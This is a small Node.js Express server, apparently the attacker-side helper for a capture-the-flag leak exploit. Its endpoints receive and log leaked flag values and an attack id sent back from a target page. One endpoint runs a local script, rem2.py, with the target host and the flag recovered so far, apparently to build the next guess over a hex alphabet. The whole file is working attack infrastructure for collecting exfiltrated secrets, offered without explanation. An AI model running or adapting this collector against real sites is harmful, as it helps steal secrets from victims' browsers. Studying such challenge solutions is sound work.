#!/usr/bin/env node
const express = require('express')
const childProcess = require('child_process')

const app = express()
const salt = process.argv[2]
const sitehostFromScript = process.argv[3]
const alphabet = '0123456789abcdef'
let atkid = 'e7d3b391bac56734b0ff13a29098bb80'
let knownflag = ''
app.use(express.static('static'))


app.get('/setknown',(req,res)=>{
	knownflag = req.query.flag
	console.log('flag',knownflag)
	res.send('')
})

app.get('/setatkid',(req,res)=>{
	atkid = req.query.atkid
	console.log('setatkid',atkid)
	res.send('')
})

app.get('/log',(req,res)=>{
	console.log('flag',req.query.log)
	res.send('')
})

app.get('/getstuff',(req,res)=>{
	console.log('get')
	let r = require('child_process').execFileSync('./rem2.py',[salt,sitehostFromScript,atkid,knownflag,'']).toString()
	res.send(r)
})

app.listen(9000)